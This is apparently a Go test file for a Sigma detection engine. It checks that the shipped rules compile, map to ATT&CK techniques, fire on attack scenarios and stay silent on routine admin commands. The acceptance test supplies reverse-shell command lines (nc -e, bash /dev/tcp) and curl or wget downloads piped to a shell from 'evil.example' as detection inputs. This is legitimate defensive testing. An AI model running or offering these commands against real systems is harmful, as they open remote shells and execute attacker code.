package sigma

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"defendsec/internal/events"
)

func shippedEngine(t *testing.T) *Engine {
	t.Helper()
	var dir string
	for _, candidate := range []string{
		"packs/sigma",
		filepath.Join("..", "..", "packs", "sigma"),
	} {
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			dir = candidate
			break
		}
	}
	if dir == "" {
		t.Fatal("could not find packs/sigma")
	}
	set, err := LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(set.Skipped()) > 0 {
		// Shipped rules must all compile. Community rules may not; ours must.
		t.Fatalf("shipped rules were skipped: %+v", set.Skipped())
	}
	if set.Len() == 0 {
		t.Fatal("no shipped rules loaded")
	}
	return NewEngine(set)
}

func TestShippedRulesLoadAndCarryTechniques(t *testing.T) {
	e := shippedEngine(t)
	for _, r := range e.RuleSet().Rules() {
		if r.ID == "" {
			t.Errorf("%q has no id", r.Title)
		}
		if r.Description == "" {
			t.Errorf("%q has no description; an analyst reads it to decide whether a match matters", r.Title)
		}
		if len(r.FalsePositives) == 0 {
			t.Errorf("%q lists no false positives, which every real rule has", r.Title)
		}
		if len(r.Techniques()) == 0 {
			t.Errorf("%q carries no ATT&CK technique", r.Title)
		}
		if r.Level == "" {
			t.Errorf("%q has no level", r.Title)
		}
	}
}

// Phase 3's acceptance names three scenarios explicitly. These assert the
// shipped rules actually fire on them, rather than trusting that they read as
// though they would.
func TestAcceptanceScenarios(t *testing.T) {
	e := shippedEngine(t)

	proc := func(image, cmdline, parent string) *events.Event {
		ev := &events.Event{
			ID: "e", DeviceID: "dev-1", Kind: events.KindProcess,
			At: time.Now().UTC(), PID: 4242, PPID: 100,
		}
		ev.Set(events.FieldImage, image)
		ev.Set(events.FieldCommandLine, cmdline)
		ev.Set(events.FieldParentImage, parent)
		return ev
	}

	t.Run("a reverse shell", func(t *testing.T) {
		for _, ev := range []*events.Event{
			proc("/usr/bin/nc", "nc -e /bin/sh 10.0.0.5 4444", "/bin/bash"),
			proc("/bin/bash", "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "/usr/sbin/nginx"),
		} {
			matches := e.Match(ev)
			if len(matches) == 0 {
				t.Errorf("no rule fired on %q", ev.String(events.FieldCommandLine))
				continue
			}
			if matches[0].Level != LevelCritical {
				t.Errorf("a reverse shell matched at %s, not critical", matches[0].Level)
			}
			if !containsTechnique(matches[0].Techniques, "T1059.004") {
				t.Errorf("techniques = %v", matches[0].Techniques)
			}
		}
	})

	t.Run("curl piped to a shell", func(t *testing.T) {
		for _, cmdline := range []string{
			"curl -fsSL https://evil.example/x.sh | sh",
			"wget -qO- https://evil.example/x.sh | bash",
			"curl https://evil.example/x.sh|sudo bash",
		} {
			if len(e.Match(proc("/bin/bash", cmdline, "/usr/sbin/sshd"))) == 0 {
				t.Errorf("no rule fired on %q", cmdline)
			}
		}
		// A download that is not piped anywhere must not fire, or the rule is
		// noise on every ordinary curl.
		if m := e.Match(proc("/usr/bin/curl", "curl -o /tmp/x https://example.com/x", "/bin/bash")); len(m) > 0 {
			t.Errorf("a plain download fired %d rules", len(m))
		}
	})

	t.Run("an ssh key added to authorized_keys", func(t *testing.T) {
		ev := &events.Event{ID: "e", DeviceID: "dev-1", Kind: events.KindFile, At: time.Now().UTC()}
		ev.Set(events.FieldTargetFilename, "/home/deploy/.ssh/authorized_keys")
		ev.Set(events.FieldFileAction, "write")
		ev.Set(events.FieldImage, "/bin/bash")
		matches := e.Match(ev)
		if len(matches) == 0 {
			t.Fatal("no rule fired on an authorized_keys write")
		}
		if !containsTechnique(matches[0].Techniques, "T1098.004") {
			t.Errorf("techniques = %v", matches[0].Techniques)
		}

		// The expected tooling must be filtered, or this fires on every
		// provisioning run and gets muted.
		expected := &events.Event{ID: "e", Kind: events.KindFile, At: time.Now().UTC()}
		expected.Set(events.FieldTargetFilename, "/home/deploy/.ssh/authorized_keys")
		expected.Set(events.FieldImage, "/usr/bin/ssh-copy-id")
		if len(e.Match(expected)) > 0 {
			t.Error("ssh-copy-id was not filtered out")
		}
	})
}

// Ordinary activity must not fire. A rule set that alerts on routine work gets
// muted, and a muted rule set detects nothing at all.
func TestShippedRulesAreQuietOnOrdinaryActivity(t *testing.T) {
	e := shippedEngine(t)

	benign := []struct{ image, cmdline, parent string }{
		{"/usr/bin/ls", "ls -la /var/log", "/bin/bash"},
		{"/usr/bin/apt-get", "apt-get install -y nginx", "/bin/bash"},
		{"/usr/bin/curl", "curl -fsSL https://example.com/api", "/usr/bin/python3"},
		{"/bin/systemctl", "systemctl restart nginx", "/bin/bash"},
		{"/usr/bin/git", "git pull origin main", "/bin/bash"},
		{"/usr/sbin/sshd", "sshd: deploy [priv]", "/usr/sbin/sshd"},
		{"/usr/bin/sudo", "sudo systemctl status nginx", "/bin/bash"},
	}
	for _, b := range benign {
		ev := &events.Event{ID: "e", DeviceID: "dev-1", Kind: events.KindProcess, At: time.Now().UTC()}
		ev.Set(events.FieldImage, b.image)
		ev.Set(events.FieldCommandLine, b.cmdline)
		ev.Set(events.FieldParentImage, b.parent)
		if matches := e.Match(ev); len(matches) > 0 {
			t.Errorf("%q fired %q", b.cmdline, matches[0].RuleTitle)
		}
	}

	// sudo escalating to root is the expected path and must be filtered.
	priv := &events.Event{ID: "e", Kind: events.KindPrivilege, At: time.Now().UTC()}
	priv.Set(events.FieldImage, "/usr/bin/sudo")
	priv.Set(events.FieldTargetUID, 0)
	if matches := e.Match(priv); len(matches) > 0 {
		t.Errorf("sudo escalation fired %q", matches[0].RuleTitle)
	}

	// An unexpected binary reaching root must fire.
	suspicious := &events.Event{ID: "e", Kind: events.KindPrivilege, At: time.Now().UTC()}
	suspicious.Set(events.FieldImage, "/tmp/exploit")
	suspicious.Set(events.FieldTargetUID, 0)
	if len(e.Match(suspicious)) == 0 {
		t.Error("an unexpected escalation to root did not fire")
	}
}

func TestCoverageReportsBlindSpots(t *testing.T) {
	c := shippedEngine(t).Describe()
	if c.Rules == 0 {
		t.Fatal("no rules")
	}
	if len(c.Techniques) == 0 {
		t.Error("no ATT&CK techniques covered")
	}
	// The per-category counts are what make a coverage map honest: a category
	// with no rules is a blind spot, and the number has to be visible.
	if len(c.ByCategory) == 0 {
		t.Error("no category breakdown")
	}
	t.Logf("rules=%d techniques=%v categories=%v", c.Rules, c.Techniques, c.ByCategory)
}

// A community rule directory contains rules no single engine implements.
// Refusing to start would mean refusing every rule because of an unrelated
// one, so they are counted and surfaced instead.
func TestLoadDirSkipsRatherThanFailing(t *testing.T) {
	dir := t.TempDir()
	good := `
title: Good
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
  condition: selection
`
	bad := `
title: Aggregating
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/su
  condition: selection | count() > 5
`
	if err := os.WriteFile(filepath.Join(dir, "good.yml"), []byte(good), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "bad.yml"), []byte(bad), 0o600); err != nil {
		t.Fatal(err)
	}
	// A non-rule file in the tree must simply be ignored.
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# rules"), 0o600); err != nil {
		t.Fatal(err)
	}

	set, err := LoadDir(dir)
	if err != nil {
		t.Fatalf("one bad rule failed the whole load: %v", err)
	}
	if set.Len() != 1 {
		t.Errorf("loaded %d rules, want the good one", set.Len())
	}
	if len(set.Skipped()) != 1 {
		t.Fatalf("skipped = %+v", set.Skipped())
	}
	// The reason has to be there, or an operator cannot tell a broken rule
	// from an unimplemented feature.
	if set.Skipped()[0].Reason == "" {
		t.Error("a skipped rule carries no reason")
	}
}

func containsTechnique(list []string, want string) bool {
	for _, t := range list {
		if t == want {
			return true
		}
	}
	return false
}
